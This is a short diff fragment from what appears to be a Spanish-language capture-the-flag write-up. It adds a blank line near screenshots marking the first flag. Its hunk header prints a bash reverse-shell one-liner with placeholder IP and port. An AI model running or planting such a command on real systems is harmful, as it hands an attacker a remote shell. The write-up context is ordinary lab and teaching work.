@@ -50,6 +50,7 @@ bash -c "bash -i >&/dev/tcp/<ip>/<port 0>&1>"
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/70a88eb6-22a8-41d5-b2a3-5ec1ac98a25d)
 
   - Primera flag :D
+
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/55354378-feea-4495-b996-13a22d06b0a8)
 
 
